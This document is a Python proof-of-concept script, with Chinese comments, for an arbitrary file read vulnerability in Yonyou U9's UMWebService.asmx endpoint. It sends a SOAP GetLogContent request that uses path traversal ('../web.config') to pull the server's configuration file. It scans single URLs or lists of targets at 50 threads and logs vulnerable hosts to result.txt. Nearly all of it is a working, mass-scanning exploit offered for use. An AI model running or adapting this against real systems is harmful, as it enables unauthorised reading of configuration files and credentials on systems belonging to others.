#用友U9 UMWebService.asmx 任意文件读取漏洞
import argparse
from multiprocessing.dummy import Pool
import requests
import sys
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

#定义横幅
def banner():
    banner = """

███████╗██╗██╗     ███████╗██████╗ ███████╗ █████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
█████╗  ██║██║     █████╗  ██████╔╝█████╗  ███████║██║  ██║
██╔══╝  ██║██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║  ██║
██║     ██║███████╗███████╗██║  ██║███████╗██║  ██║██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝                      
                                    version:YongyouU9_UMwebservice_FileRead
                                    Author: hi6
                                                
"""
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="用友U9 UMWebService.asmx 任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    # ses = requests.Session()
    payload = "/u9/OnLine/UMWebService.asmx"
    url = target + payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36", 
        "Content-Type": "text/xml; charset=utf-8", 
        "Soapaction": "\"http://tempuri.org/GetLogContent\"", 
        "Accept-Encoding": "gzip"
        }
    data = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\n    <GetLogContent xmlns=\"http://tempuri.org/\">\r\n      <fileName>../web.config</fileName>\r\n    </GetLogContent>\r\n  </soap:Body>\r\n</soap:Envelope>"
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    try:
        re = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies,timeout=5)
        if re.status_code == 200 and 'xml' in re.text and '&' in re.text:
            print(f'{GREEN}[+] {url} 存在任意文件读取漏洞！{RESET}')
            with open('result.txt',mode='a',encoding='utf-8')as ft:
                ft.write(target+'\n')
        else:
            print('不存在该漏洞!!')
    except:
        pass


if __name__ == '__main__':
    main()
